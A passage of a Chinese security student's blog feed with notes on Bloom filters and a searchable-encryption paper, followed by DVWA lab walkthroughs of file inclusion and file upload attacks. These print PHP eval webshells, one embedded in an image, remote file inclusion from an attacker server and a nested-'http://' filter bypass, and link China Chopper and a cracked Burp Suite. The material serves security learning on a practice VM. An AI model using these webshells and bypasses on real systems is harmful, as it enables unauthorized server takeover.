alt="image3"></p><p>但是这样会出现一个问题，如果比特数组长度不够大，那么随着新元素的不断加入，比特数组中的大部分索引位置都会被置为1，比如这里三个索引位置都为1了，后面再查询一个不存在的元素结果都为1，显示存在，就会出现误报率了。</p><p>可见，在使用布隆过滤器的时候，如果想得到一个可接受的无保留，那么首先要<strong>选择合适的哈希函数</strong>，其次要<strong>协调好哈希函数数量和比特数组大小之间的关系</strong>。</p><p>参考</p><p><u><code>https://blog.huoding.com/2020/06/22/825</code></u></p></li></ul>]]></content>
      
      
      <categories>
          
          <category> 论文研读 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 研究生学习日常 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Privacy-Preserving Multi-Keyword Searchable Encryption for Distributed Systems——论文研读</title>
      <link href="/2021/10/22/Privacy-Preserving-Multi-Keyword-Searchable-Encryption-for-Distributed-Systems%E2%80%94%E2%80%94%E8%AE%BA%E6%96%87%E7%A0%94%E8%AF%BB/"/>
      <url>/2021/10/22/Privacy-Preserving-Multi-Keyword-Searchable-Encryption-for-Distributed-Systems%E2%80%94%E2%80%94%E8%AE%BA%E6%96%87%E7%A0%94%E8%AF%BB/</url>
      
        <content type="html"><![CDATA[<h1 id="论文汇报"><a href="#论文汇报" class="headerlink" title="论文汇报"></a>论文汇报</h1><p>本周我看了一篇将可搜索加密运用到分布式存储上的一篇论文——<em><strong>《Privacy-Preserving Multi-Keyword Searchable Encryption for Distributed Systems》</strong></em>。这篇论文的技术要点主要是讲本文提出的一个子集判断策略和上次我看的<em><strong>Distributed Two-Trapdoor Public-Key Cryptosystem(DT-PKC)<em><strong>相结合起来，这样不仅可以在</strong></em>MW/MR</strong></em>上对加密数据进行多关键字搜索，而且还保证了数据和搜索模式的隐私性；并且为了防止KGA，里面还采用了多服务器架构，通过只允许授权服务器联合测试搜索令牌是否与存储的密文相匹配，加快了搜索相应，分担了工作负载，降低了密钥泄露风险。</p><h2 id="子集判断策略"><a href="#子集判断策略" class="headerlink" title="子集判断策略"></a>子集判断策略</h2><p><img src="/2021/10/22/Privacy-Preserving-Multi-Keyword-Searchable-Encryption-for-Distributed-Systems%E2%80%94%E2%80%94%E8%AE%BA%E6%96%87%E7%A0%94%E8%AF%BB/image1.png" alt="image1"></p><p>对于一个通用集合<em><strong>W</strong></em>，这里来判断包含于该通用集合<em><strong>W</strong></em>中的两个子集合***W<sub>T</sub><em><strong>和</strong></em>W<sub>t</sub><em><strong>之间的包含关系，即</strong></em>W<sub>t</sub>***是否包含于W<sub>T</sub>之中。</p><p>对于拥有***$\mu$<em><strong>个关键字的集合</strong></em>W=<em>{$\omega$<sub>$\mu$-1</sub>,…,$\omega$<sub>0</sub>}<strong>，用一个十进制数来表示，并且该十进制数的二进制表示出来每一位都表示一个关键字的存在状态，若为1即表示包含该关键字，为0则不包含；同样的也这样表示</strong></em>W<sub>T</sub><em><strong>和</strong></em>W<sub>t</sub>***，接下来就是这个算法的执行过程：</p><p><img src="/2021/10/22/Privacy-Preserving-Multi-Keyword-Searchable-Encryption-for-Distributed-Systems%E2%80%94%E2%80%94%E8%AE%BA%E6%96%87%E7%A0%94%E8%AF%BB/image2.png" alt="image2"></p><p>并且当***W<sub>t</sub><em><strong>包含于</strong></em>W<sub>T</sub>***中时，该子集判断流程还可以优化为下面这个算法：</p><p><img src="/2021/10/22/Privacy-Preserving-Multi-Keyword-Searchable-Encryption-for-Distributed-Systems%E2%80%94%E2%80%94%E8%AE%BA%E6%96%87%E7%A0%94%E8%AF%BB/image3.png" alt="image3"></p><h2 id="SE-EPOM"><a href="#SE-EPOM" class="headerlink" title="SE-EPOM"></a>SE-EPOM</h2><p>本文提出的<em><strong>A Searchable Encryption based on Efficient Privacy-preserving Outsourced calculation framework with Multiple keys</strong></em>的大致流程如下：</p><ol><li><em><strong>KeyGen(1<sup>$\kappa$</sup>)</strong></em>$\to$(PK<sub>DP</sub>,SK<sub>DP</sub>,PK<sub>RU</sub>,SK<sub>RU</sub>,SK<sub>CP</sub>,SK<sub>IS</sub>)</li><li><em><strong>Store(PK<sub>DP</sub>,W<sub>T</sub>)</strong></em>$\to$SC</li><li>***Trapdoor(PK<sub>Ru</sub>,W<sub>t</sub>)$\to$***td</li><li>***Test(PK<sub>DP</sub>,SK<sub>CP</sub>,SK<sub>IS</sub>,PK<sub>RU</sub>,td,SC)$\to$***0/1</li></ol><h3 id="系统介绍"><a href="#系统介绍" class="headerlink" title="系统介绍"></a>系统介绍</h3><h4 id="成员介绍："><a href="#成员介绍：" class="headerlink" title="成员介绍："></a>成员介绍：</h4><p><img src="/2021/10/22/Privacy-Preserving-Multi-Keyword-Searchable-Encryption-for-Distributed-Systems%E2%80%94%E2%80%94%E8%AE%BA%E6%96%87%E7%A0%94%E8%AF%BB/image4.png" alt="image4"></p><ul><li>KGC:受信任的KGC的任务是分发和管理系统中的公钥和私钥。</li><li>CP:CP有“无限”的数据存储空间，并存储和管理所有注册的RUs的外包数据。CP还以加密的形式存储所有中间结果和最终结果。此外，CP能够对加密数据执行某些计算。</li><li>IS: 组织的内部服务器进行部分计算，以协助CP处理搜索查询。实际上，IS可以被指定为组织中的服务器。</li><li>DP:每个数据提供者根据公共参数生成自己的公开和秘密密钥对，根据与文档相关的关键字计算可搜索密文，并将文档与可搜索密文一起存储在CP上。</li><li>RU:每个请求用户生成自己的基于DP的公开和秘密密钥对，并为感兴趣的特定关键字计算陷门。它对CP返回的搜索结果进行解密，获得满足搜索查询的文档的索引。</li></ul><h4 id="Detailed-Construction："><a href="#Detailed-Construction：" class="headerlink" title="Detailed Construction："></a>Detailed Construction：</h4><h5 id="KeyGen"><a href="#KeyGen" class="headerlink" title="KeyGen:"></a><em><strong>KeyGen:</strong></em></h5><ul><li><p>KGC运行<em><strong>DT-PKC</strong></em>中的KeyGen算法来得到<em><strong>the strong private key</strong></em> <em><strong>SK=$\lambda$</strong></em>,并且运行<strong>D<em>T-PKC</em></strong>中的<strong>S<em>Keys</em></strong>算法来得到两个<strong>p<em>artial strong private key</em></strong> <em><strong>SK<sup>(1)</sup>=$\lambda$ <sub>1</sub>,SK<sup>(2)</sup>=$\lambda$<sub>2</sub></strong></em>;初始化一个通用集合<strong>W</strong>。</p></li><li><p>最后公共参数<em><strong>PP=(W,$\mu$,N,g)</strong></em>,<strong>S<em>K<sub>CP</sub>=SK<sup>(1)</sup>=$\lambda$<sub>1</sub></em></strong>,<strong>S<em>K<sub>IS</sub>=SK<sup>(2)</sup>=$\lambda$<sub>2</sub></em></strong></p><p>​                        <em><strong>pk<sub>DP</sub>=(N,g,h<sub>DP</sub>),sk<sub>DP</sub>=$\theta$<sub>DP</sub></strong></em></p><p>​                        <em><strong>pk<sub>RU</sub>=(N,g,h<sub>RU</sub>),sk<sub>RU</sub>=$\theta$<sub>RU</sub></strong></em></p></li></ul><h5 id="Store"><a href="#Store" class="headerlink" title="Store:"></a><em><strong>Store:</strong></em></h5><p>这时一个或多个DP来上传自己的文件和相关的关键字集合<em><strong>W<sub>T</sub></strong></em>,用一个十进制数<em><strong>T</strong></em>来表示，其二进制表示为***(T<sub>$\mu$</sub>,…,T<sub>0</sub>)<em><strong>,最后运行</strong>D</em>T-PKC<em><strong>中的</strong>E</em>nc*<strong>算法得到结果</strong>[*T]<sub>pk<sub>DP</sub></sub>***并发送给CP。</p><h5 id="Trapdoor"><a href="#Trapdoor" class="headerlink" title="Trapdoor:"></a><em><strong>Trapdoor:</strong></em></h5><p>此时RU会根据自己想要查询的多个关键字相较于通用集合<em><strong>W</strong></em>生成一个关键字集合<em><strong>W<sub>t</sub></strong></em>,同上一步进行加密后得到结<em><strong>果[t]<sub>pk<sub>RU</sub></sub><em><strong>并发送给</strong></em>CP</strong></em>。</p><h5 id="Test"><a href="#Test" class="headerlink" title="Test:"></a>Test:</h5><p>最后的测试阶段有如下四步：</p><p><img src="/2021/10/22/Privacy-Preserving-Multi-Keyword-Searchable-Encryption-for-Distributed-Systems%E2%80%94%E2%80%94%E8%AE%BA%E6%96%87%E7%A0%94%E8%AF%BB/image5.png" alt="image5"></p><p><img src="/2021/10/22/Privacy-Preserving-Multi-Keyword-Searchable-Encryption-for-Distributed-Systems%E2%80%94%E2%80%94%E8%AE%BA%E6%96%87%E7%A0%94%E8%AF%BB/image6.png" alt="image6"></p><p><img src="/2021/10/22/Privacy-Preserving-Multi-Keyword-Searchable-Encryption-for-Distributed-Systems%E2%80%94%E2%80%94%E8%AE%BA%E6%96%87%E7%A0%94%E8%AF%BB/image7.png" alt="image7"></p><p><img src="/2021/10/22/Privacy-Preserving-Multi-Keyword-Searchable-Encryption-for-Distributed-Systems%E2%80%94%E2%80%94%E8%AE%BA%E6%96%87%E7%A0%94%E8%AF%BB/image8.png" alt="image8"></p><p>这里只是一个文档和它的关键字集合，如果RU的查询关键字集合是这个文档的关键字集合的子集，说明这个查询结果是正确的。类似的可以推广到多个文件和其对应的关键字集合中来。</p><p><strong>对于这一步我个人理解为查找的过程，因为本篇论文中只是给出了一个文件的匹配过程，如果上传的文件数量多的话这种查询方式的效率可能会很低。</strong></p>]]></content>
      
      
      <categories>
          
          <category> 论文研读 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 研究生学习日常 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>文件包含漏洞</title>
      <link href="/2021/10/21/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/"/>
      <url>/2021/10/21/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/</url>
      
        <content type="html"><![CDATA[<h1 id="文件包含漏洞渗透攻击"><a href="#文件包含漏洞渗透攻击" class="headerlink" title="文件包含漏洞渗透攻击"></a>文件包含漏洞渗透攻击</h1><h2 id="文件包含漏洞"><a href="#文件包含漏洞" class="headerlink" title="文件包含漏洞"></a>文件包含漏洞</h2><p><img src="/2021/10/21/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/image1.png" alt="image1"></p><p>进入靶机网页，</p><p><img src="/2021/10/21/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/image2.png" alt="image2"></p><p><a href="http://192.168.176.135/dvwa/vulnerabilities/fi/?page=include.php">http://192.168.176.135/dvwa/vulnerabilities/fi/?page=include.php</a></p><p>这里其实是将靶机目录/var/www/dvaw/vulnerabilities/fi/下的include.php文件传给index.php(即文件包含)</p><p>这种攻击的想法是将本机的某个病毒文件或其他服务器的某个病毒文件传给index.php并执行。</p><p>我们可以尝试一下将本机的其他文件包含给index.php，例如先在本机目录/var/www/dvaw/vulnerabilities/fi/下创建x.txt文件，然后将x.txt文件传给index.php</p><p><img src="/2021/10/21/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/image3.png" alt="image3"></p><p><img src="/2021/10/21/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/image4.png" alt="image4"></p><p>这里就显示了x.txt的内容<img src="/2021/10/21/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/image5.png" alt="image5"></p><h2 id="关于文件包含"><a href="#关于文件包含" class="headerlink" title="关于文件包含"></a>关于文件包含</h2><p>我们可以分为本机包含和外机包含，即将本机的文件传给某个文件就是本机包含，将其他服务器的文件传给某个文件就是外机包含。</p><h2 id="安全等级为low的文件包含漏洞渗透攻击"><a href="#安全等级为low的文件包含漏洞渗透攻击" class="headerlink" title="安全等级为low的文件包含漏洞渗透攻击"></a>安全等级为low的文件包含漏洞渗透攻击</h2><h3 id="本机包含攻击"><a href="#本机包含攻击" class="headerlink" title="本机包含攻击"></a>本机包含攻击</h3><p>将安全等级设置为low，进入文件包含查看后端代码</p><p><img src="/2021/10/21/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/image6.png" alt="image6"></p><p>找一张属性合适的图片，利用edjpgcom软件将一句话代码写入图片中</p><p><strong>写入过程</strong>：</p><p>将图片拖入edjpgcom.exe中，然后写入一句话木马</p><p><img src="/2021/10/21/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/image7.png" alt="image7"></p><p>该代码为</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?fputs(fopen(&quot;shell20.php&quot;,&quot;w&quot;),&#x27;&lt;?php eval($_POST[yangge]);?&gt;&#x27;)?&gt;</span><br></pre></td></tr></table></figure><p>意思是打开一个shell20.php,然后往里面写入</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">eval</span>(<span class="variable">$_POST</span>[yangge]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>写入完毕后，我们可以直接将该图片上传</p><p><img src="/2021/10/21/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/image8.png" alt="image8"></p><p>上传成功，复制上传的文件地址，然后开始文件包含</p><p><img src="/2021/10/21/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/image9.png" alt="image9"></p><p>文件包含成功，这个文件成功执行，我们可以在靶机的目录/var/www/dvaw/vulnerabilities/fi/下找到shell20.php</p><p><img src="/2021/10/21/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/image10.png" alt="image10"></p><p>我们可以在中国菜刀上输入这个shell20.php的地址<a href="http://192.168.176.135/dvwa/vulnerabilities/fi/shell20.php">http://192.168.176.135/dvwa/vulnerabilities/fi/shell20.php</a></p><p><img src="/2021/10/21/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/image11.png" alt="image11"></p><p>入侵成功！</p><h3 id="外机包含攻击"><a href="#外机包含攻击" class="headerlink" title="外机包含攻击"></a>外机包含攻击</h3><p>我们只需要搭建一个服务器，然后在服务器上上传病毒文件，在靶机网页上的文件包含那一块指向这个服务器的病毒文件地址就可以了</p><h4 id="Ubuntu-下Apache安装和配置"><a href="#Ubuntu-下Apache安装和配置" class="headerlink" title="Ubuntu 下Apache安装和配置"></a>Ubuntu 下Apache安装和配置</h4><p>安装apache，在命令行终端中输入一下命令：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ sudo apt-get install apache2</span><br></pre></td></tr></table></figure><p>安装完成后，重启apache服务，在命令行终端中输入一下命令：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ sudo /etc/init.d/apache2 restart</span><br></pre></td></tr></table></figure><p>apache安装完成后会自动在/var下建立一个名为www的目录，这就是Web目录，所有要能过浏览器访问的Web文件都要放到这个目录里。</p><p>我们可以在本机浏览器上登录该服务器</p><p>可以在url上输入<a href="http://localhost或者http//127.0.0.1%E5%B0%B1%E5%8F%AF%E4%BB%A5%E7%99%BB%E5%BD%95%E8%AF%A5%E6%9C%8D%E5%8A%A1%E5%99%A8">http://localhost或者http://127.0.0.1就可以登录该服务器</a></p><p><img src="/2021/10/21/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/image12.png" alt="image12"></p><p>或者在外部机器上输入本机IP地址就可以登录该服务器</p><p><img src="/2021/10/21/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/image13.png" alt="image13"></p><p>安装完毕我们在服务器机器上建立一个病毒文件</p><p><img src="/2021/10/21/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/image14.png" alt="image14"></p><p>我们建立了一个zym.txt文件，文件内容为</p><p><img src="/2021/10/21/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/image15.png" alt="image15"></p><p>我们在浏览器上打开这个文件并复制文件地址</p><p><img src="/2021/10/21/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/image16.png" alt="image16"></p><p>然后我们直接进入靶机服务器的文件包含，将index.php改为该地址，回车，执行完毕</p><p>我们可以在目录/var/www/dvaw/vulnerabilities/fi/下找到shell.php文件</p><p><img src="/2021/10/21/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/image17.png" alt="image17"></p><p>接下来在中国菜刀上输入该文件地址就入侵成功了！</p><h2 id="安全等级为medium的文件包含漏洞渗透攻击"><a href="#安全等级为medium的文件包含漏洞渗透攻击" class="headerlink" title="安全等级为medium的文件包含漏洞渗透攻击"></a>安全等级为medium的文件包含漏洞渗透攻击</h2><p>将安全级别设为medium，我们进入文件包含查看后端代码</p><p><img src="/2021/10/21/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/image18.png" alt="image18"></p><p>我们可以看到只是多了将http://或者https://替换为空，因此本机包含入侵还是可以正常进行，但是外机包含入侵会在url上多http://或者https://，我们如果像之前一样操作会使得地址缺失</p><p>于是我们在原先的地址<a href="http://192.168.176.129/zym.txt%E4%B8%8A%E5%B0%86http://%E6%94%B9%E4%B8%BAh**http://**ttp://%E6%88%96%E8%80%85htt**http://**p://%E7%AD%89%E7%AD%89%EF%BC%8C%E8%BF%99%E6%A0%B7%E9%9D%B6%E6%9C%BA%E4%BC%9A%E8%87%AA%E5%8A%A8%E5%B0%86%E4%B8%AD%E9%97%B4%E7%9A%84http://%E6%94%B9%E4%B8%BA%E7%A9%BA%EF%BC%8C%E8%BF%99%E6%A0%B7%E5%B0%B1%E8%83%BD%E6%89%A7%E8%A1%8C%E6%88%90%E5%8A%9F%E5%B9%B6%E7%94%9F%E6%88%90shell20.php%E6%96%87%E4%BB%B6%EF%BC%8C%E7%84%B6%E5%90%8E%E5%85%A5%E4%BE%B5%E6%88%90%E5%8A%9F%E4%BA%86%EF%BC%81">http://192.168.176.129/zym.txt上将http://改为h**http://**ttp://或者htt**http://**p://等等，这样靶机会自动将中间的http://改为空，这样就能执行成功并生成shell20.php文件，然后入侵成功了！</a></p><h2 id="安全等级为high的文件包含漏洞渗透攻击"><a href="#安全等级为high的文件包含漏洞渗透攻击" class="headerlink" title="安全等级为high的文件包含漏洞渗透攻击"></a>安全等级为high的文件包含漏洞渗透攻击</h2><p>将安全级别设为high，我们进入文件包含查看后端代码</p><p><img src="/2021/10/21/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/image19.png" alt="image19"></p><p>可以看到由于指定了文件包含的文件名，因此我们的两种攻击方式全部失效，但是这种开发方式是很笨重的，不易于后期的修改。</p>]]></content>
      
      
      <categories>
          
          <category> web安全渗透学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 小白，学习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>文件上传漏洞</title>
      <link href="/2021/10/21/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"/>
      <url>/2021/10/21/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/</url>
      
        <content type="html"><![CDATA[<h1 id="Web安全渗透学习"><a href="#Web安全渗透学习" class="headerlink" title="Web安全渗透学习"></a>Web安全渗透学习</h1><h2 id="安全渗透环境准备"><a href="#安全渗透环境准备" class="headerlink" title="安全渗透环境准备"></a>安全渗透环境准备</h2><p>对于前期的学习我们需要下载一个适于新手学习的靶机——owaspbwa，该靶机是基于linux系统的，下载地址为<a href="https://jaist.dl.sourceforge.net/project/owaspbwa/1.2/OWASP_Broken_Web_Apps_VM_1.2.7z">https://jaist.dl.sourceforge.net/project/owaspbwa/1.2/OWASP_Broken_Web_Apps_VM_1.2.7z</a></p><p>下载安装后，登入系统</p><p><img src="/2021/10/21/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/image1.png" alt="image1"></p><p>这里提示可以在浏览器的地址栏输入192.168.176.135来进入该网页，进入后用户名和密码都为默认的admin。</p><p>中国菜刀的下载地址为<a href="https://lanzous.com/id5jleh">https://lanzous.com/id5jleh</a></p><h3 id="文件上传漏洞渗透及防御的学习——安全级别为low"><a href="#文件上传漏洞渗透及防御的学习——安全级别为low" class="headerlink" title="文件上传漏洞渗透及防御的学习——安全级别为low"></a>文件上传漏洞渗透及防御的学习——安全级别为low</h3><p>进入后找到<img src="/2021/10/21/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/image2.png" alt="image2">，这里进行文件上传漏洞渗透及防御的学习。</p><p>点进去后找到这个<img src="/2021/10/21/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/image3.png" alt="image3"></p><p>可以设置安全级别，首先是级别最低的<em><strong>low</strong></em></p><p><img src="/2021/10/21/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/image4.png" alt="image4"></p><p>进入文件上传的界面，右下角有查看后端代码的选项，点进去查看</p><p><img src="/2021/10/21/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/image5.png" alt="image5"></p><p>可见一份比较简易的后端php代码，这里没有对文件的识别，本来这里是只能上传图片的，由于没有识别机制，故我们可以上传一些恶意的代码上去，比如</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&quot;chopper&quot;</span>]); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>也可以简易成</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>(<span class="variable">$_POST</span>[chopper]); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>或者为</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">eval</span>(<span class="variable">$_POST</span>[chopper]); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>这就是一句话木马，里面chopper为登录的变量名，采用POST方式我们可以直接在中国菜刀软件上进行对靶机的入侵；如果为REQUEST方式的话，我们就只能在url行上对靶机进行入侵。</p><p>由于这里安全级别很低，故我们能直接将这段恶意代码上传上去。</p><p><img src="/2021/10/21/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/image6.png" alt="image6"></p><p>可见恶意代码上传成功，我们复制这段地址*../../hackable/uploads/shell.php<em>在本页面上的url地址上去掉</em>*#**，然后加上这段地址，回车就能打开这份文件，但这个文件在网页上是不会显示什么的。</p><p><img src="/2021/10/21/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/image7.png" alt="image7"></p><p>打开后我们复制这个文件的绝对地址<a href="http://192.168.176.135/dvwa/hackable/uploads/shell.php%EF%BC%8C%E6%88%91%E4%BB%AC%E5%86%8D%E5%9C%A8%E4%B8%AD%E5%9B%BD%E8%8F%9C%E5%88%80%E8%BD%AF%E4%BB%B6%E4%B8%8A%E6%89%93%E5%BC%80%E3%80%82">http://192.168.176.135/dvwa/hackable/uploads/shell.php，我们再在中国菜刀软件上打开。</a></p><p>下载好打开<strong>caidao.exe</strong><img src="/2021/10/21/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/image8.png" alt="image8"></p><p><img src="/2021/10/21/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/image9.png" alt="image9"></p><p>新建shell，地址为该文件的绝对地址，后面输入代码中设置的变量名<strong>chopper</strong></p><p><img src="/2021/10/21/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/image10.png" alt="image10"></p><p>这样就入侵成功！</p><h3 id="文件上传漏洞渗透及防御的学习——安全级别为medium"><a href="#文件上传漏洞渗透及防御的学习——安全级别为medium" class="headerlink" title="文件上传漏洞渗透及防御的学习——安全级别为medium"></a>文件上传漏洞渗透及防御的学习——安全级别为medium</h3><p>将安全级别调至medium</p><p><img src="/2021/10/21/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/image11.png" alt="image11"></p><p>此时再查看文件上传的后端代码</p><p><img src="/2021/10/21/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/image12.png" alt="image12"></p><p>我们可以看到这里加了一段检测代码，只有文件的MIME类型为“image/jpeg”且文件大小小于100000字节时，文件才能上传成功。这说明我们再直接上传那段恶意代码就会被检测出来，导致上传不成功。</p><p>关于MIME类型可以自行百度，每一个文件都会有各自唯一的MIME类型。</p><p>我们可以在Ubuntu上安装Burpsuite,下载地址为</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://pan.baidu.com/s/1kTiGgVP</span><br></pre></td></tr></table></figure><p>解压密码为freebuf</p><p>首先下来这个文件，Burpsuite需要java支持，因此先安装java环境，打开命令行输入：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install default-jre</span><br></pre></td></tr></table></figure><p>安装完成后解压文件，给BurpLoader.jar执行权限，</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chmod +x BurpLoader.jar</span><br></pre></td></tr></table></figure><p>然后输入</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar BurpLoader.jar</span><br></pre></td></tr></table></figure><p>便运行成功了，但为了更加简单的访问burpsuite我们进行如下操作，将burp复制到/opt/burpsuite目录：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mv brup1.6 /opt/</span><br></pre></td></tr></table></figure><p>然后将brup的名字改为burpsuite</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mv brup1.6/ burpsuite</span><br></pre></td></tr></table></figure><p>然后在/usr/bin/下创建文件burpsuite</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">touch /usr/bin/burpsuite</span><br></pre></td></tr></table></figure><p>此时burpsuite无法写入和修改，我们修改它的权限</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo chmod 777 burpsuite</span><br></pre></td></tr></table></figure><p>接下来编辑这个文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim /usr/bin/burpsuite</span><br></pre></td></tr></table></figure><p>输入：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#!/bin/bash</span><br><span class="line">java -jar /opt/burpsuite/BurpLoader.jar</span><br></pre></td></tr></table></figure><p>保存后，给这个文件执行权限</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chmod +x /usr/bin/burpsuite </span><br></pre></td></tr></table></figure><p>后面就可以直接在命令行输入burpsuite就可以直接打开这款软件了，安装完毕！</p><p>打开这款软件</p><p><img src="/2021/10/21/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/image13.png" alt="image13"></p><p>画圈处proxy为代理功能，<img src="/2021/10/21/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/image14.png" alt="image14"></p><p>点到设置，<img src="/2021/10/21/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/image15.png" alt="image15"></p><p>设置为All interfaces，这样所有机器都能用这台机器作为代理服务器，即外部机器将代理地址设为本机的IP地址后，每次的http(s)请求都要通过本机。</p><p>可以使用</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ss -tnlp</span><br></pre></td></tr></table></figure><p>命令来查看端口打开状态，可见8080端口对所有机器都是打开状态</p><p><img src="/2021/10/21/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/image16.png" alt="image16"></p><p>此时默认的拦截服务是关闭状态</p><p><img src="/2021/10/21/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/image17.png" alt="image17"></p><p>我们将外部机器的火狐浏览器的代理地址改为这台机器的IP地址</p><p>按<strong>Alt</strong>键会出现<img 